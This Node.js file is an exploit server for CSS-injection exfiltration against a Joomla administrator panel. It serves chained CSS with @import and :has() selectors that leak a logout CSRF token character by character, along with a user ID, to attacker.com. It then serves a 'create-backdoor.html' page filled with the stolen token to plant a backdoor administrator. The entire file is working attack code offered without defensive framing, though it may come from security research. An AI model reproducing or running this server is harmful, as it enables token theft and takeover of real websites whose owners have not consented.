const connect = require("connect");
const http = require("http");
const url = require("url");
const fs = require("node:fs");

const VICTIM = "http://victim.com:8000";
const PORT = 5001;
const PROTOCOL = "http://";
const HOSTNAME = "attacker.com";
const HEX = "abcdef0123456789".split("");
const PREFIX = "/administrator/index.php?option=com_login&task=logout&";
const SELECTOR = '[href^="' + PREFIX + '"]';

const USER_SELECTOR = 'a[title="Edit User ahacker"]';
const USER_ANCHOR_PREFIX =
  "/administrator/index.php?option=com_users&task=user.edit&id=";

var session = new Map(),
  stop = false;

const app = connect();
const compression = require("compression");
app.use(compression());

app.use("/start", function (request, response) {
  if (stop) {
    response.end();
    return;
  }
  session = new Map();
  session.set("startToken", PREFIX);
  session.set("chrPos", 0);
  session.set("pendingRequests", []);
  session.set("token", "");
  session.set("userId", 0);
  genResponse(request, response, 0);
});

app.use("/leak", function (request, response) {
  if (stop) {
    response.end();
    return;
  }
  let req = url.parse(request.url, url);
  response.end();
  let startToken = req.query.startToken;
  if (typeof startToken != "undefined") {
    if (startToken.length > session.get("startToken").length) {
      console.log("Leak", startToken);
      session.set("startToken", startToken);
      let pendingRequests = session.get("pendingRequests");
      if (pendingRequests) {
        if (pendingRequests.length) {
          let pendingRequest = pendingRequests.shift();
          processRequest(pendingRequest.request, pendingRequest.response);
        }
      }
    }
  }
});

app.use("/next", function (request, response) {
  if (stop) {
    response.end();
    return;
  }

  if (session.get("chrPos") > 32) {
    response.end();
    return;
  }

  let pendingRequests = session.get("pendingRequests");
  pendingRequests.push({ request, response });
  session.set("pendingRequests", pendingRequests);
});

app.use("/exploit", function (request, response) {
  response.writeHead(200, { "Content-Type": "text/html" });
  try {
    let userId = session.get("userId");
    userId++;
    const data = fs
      //.readFileSync("make-super-admin-enable.html", "utf8")
      .readFileSync("create-backdoor.html", "utf8")
      .replaceAll("$token", session.get("token"))
      .replaceAll("$userId", userId)
      .replaceAll("$victim", VICTIM);
    response.write(data);
  } catch (err) {
    console.error(err);
  }
  response.end();
});

app.use("/collect-id", function (request, response) {
  if (stop) {
    response.end();
    return;
  }
  let req = url.parse(request.url, url);
  let id = +String(req.query.id);
  session.set("userId", id);
  response.end();
});

app.use("/collect", function (request, response) {
  if (stop) {
    response.end();
    return;
  }
  let req = url.parse(request.url, url);
  let value = String(req.query.value);
  session.set("token", value.replace(PREFIX, "").trim());
  response.end();
  completed();
  stop = true;
});

const genResponse = (request, response, chrPos) => {
  let css =
    "@import url(" +
    PROTOCOL +
    HOSTNAME +
    ":" +
    PORT +
    "/next?" +
    Date.now() +
    ");";
  const startToken = session.get("startToken");
  css += HEX.map(
    (e) =>
      "html:has(" +
      SELECTOR +
      '[href^="' +
      escapeCSS(startToken + e) +
      '"]){--chr' +
      chrPos +
      ':url("' +
      PROTOCOL +
      HOSTNAME +
      ":" +
      PORT +
      "/leak?startToken=" +
      encodeURIComponent(startToken + e) +
      '");}'
  ).join("");
  css +=
    "html:has(" +
    SELECTOR +
    '[href="' +
    escapeCSS(startToken) +
    '=1"]){--full:url(' +
    PROTOCOL +
    HOSTNAME +
    ":" +
    PORT +
    "/collect?value=" +
    encodeURIComponent(startToken) +
    ");}";
  if (chrPos === 0) {
    for (let i = 1; i <= 1100; i++) {
      css +=
        "html:has(" +
        USER_SELECTOR +
        '[href="' +
        escapeCSS(USER_ANCHOR_PREFIX + i) +
        '"]){--uid:url(' +
        PROTOCOL +
        HOSTNAME +
        ":" +
        PORT +
        "/collect-id?id=" +
        encodeURIComponent(i) +
        ");}";
    }
    let variables = [];
    for (let i = 0; i < 32; i++) {
      variables.push("var(--chr" + i + ",none)");
    }
    variables.push("var(--full,none)");
    variables.push("var(--uid,none)");
    css += "html{background:" + variables.join(",") + ";}";
  }
  response.writeHead(200, { "Content-Type": "text/css" });
  response.write(css);
  response.end();
};

const server = http.createServer(app).listen(PORT, (err) => {
  if (err) {
    return console.log("[-] Error: something bad happened", err);
  }
  console.log("[+] Server is listening on %d", PORT);
});

function processRequest(request, response) {
  session.set("chrPos", session.get("chrPos") + 1);
  genResponse(request, response, session.get("chrPos"));
}

function escapeCSS(str) {
  return str.replace(/(["\\])/g, "\\$1");
}

function completed() {
  console.log("---Got userId!----", session.get("userId"));
  console.log("---Got token!----", session.get("token"));
  console.log("---Exploit page----");
  console.log("http://" + HOSTNAME + ":" + PORT + "/exploit");
}
